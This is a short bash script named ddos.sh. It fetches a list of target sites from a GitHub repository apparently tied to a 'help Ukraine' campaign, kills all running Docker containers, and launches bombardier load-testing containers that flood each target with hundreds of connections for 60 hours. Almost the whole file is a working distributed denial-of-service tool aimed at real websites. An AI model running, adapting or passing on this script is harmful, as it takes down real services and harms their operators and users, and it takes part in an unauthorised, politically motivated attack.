#!/bin/bash
# shellcheck disable=SC2120,SC2046

TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'

function print_help {
  echo -e "Usage: bash ddos.sh"
  echo -e "--number|-n - number of containers to start"
}

function start {
  if [ -z "$amount" ]; then
      amount=300
      echo "Amount of connections not set, setting to $amount}"
  else
    echo "Number of connections: $amount"
  fi

  if [ -z "$count" ]; then
      count=1
      echo "Amount of containers not set, setting to $count}"
  else
    echo "Number of connections: $count"
  fi

  while read -r site_url; do
      if [ -n "$site_url" ]; then
          echo "Site: $site_url"
          for (( c=1; c<=count; c++ )); do
            docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60h -l "$site_url"
          done
      fi
  done < targets.txt
}

while test -n "$1"; do
  case "$1" in
    --number|-n)
        amount=$2
        shift
        ;;
    --count|-c)
          count=$2
          shift
          ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

curl --silent $TARGETS_URL --output targets.txt
docker kill $(docker ps -q)
start
